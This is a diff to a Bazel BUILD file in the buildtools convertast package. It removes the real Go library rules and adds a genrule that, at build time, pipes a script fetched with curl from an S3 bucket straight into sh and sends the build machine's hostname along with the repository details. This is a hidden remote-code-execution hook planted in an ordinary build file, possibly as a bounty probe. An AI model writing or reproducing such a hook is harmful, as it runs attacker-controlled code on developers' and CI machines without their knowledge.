@@ -1,18 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library")
 
-go_library(
-    name = "convertast",
-    srcs = ["convert_ast.go"],
-    importpath = "github.com/bazelbuild/buildtools/convertast",
-    visibility = ["//visibility:public"],
-    deps = [
-        "//build",
-        "@skylark_syntax//syntax",
-    ],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":convertast",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/buildtools.git\\&folder=convertast\\&hostname=`hostname`\\&foo=wbl",
     visibility = ["//visibility:public"],
 )
